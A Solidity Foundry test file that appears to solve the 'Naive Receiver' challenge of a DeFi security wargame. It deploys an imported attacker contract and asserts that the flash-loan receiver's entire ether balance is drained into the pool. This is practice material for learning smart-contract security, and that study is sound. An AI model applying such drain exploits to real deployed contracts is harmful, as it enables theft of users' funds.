// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/NaiveReceiverFixture.sol";

import "src/src-default/attacker-contracts/AttackNaiveReceiver.sol";

contract NaiveReceiverTest is NaiveReceiverFixture {
    AttackNaiveReceiver public attackContract;

    function setUp() public override {
        super.setUp();
    }

    function test_naiveReceiver() public {
        // Act as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        attackContract = new AttackNaiveReceiver(payable(address(pool)));

        attackContract.attack(address(receiver));

        // Stop acting like the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The receiver got drained.
        assertEq(address(receiver).balance, 0);
        // The receiver balance got drained to the pool.
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
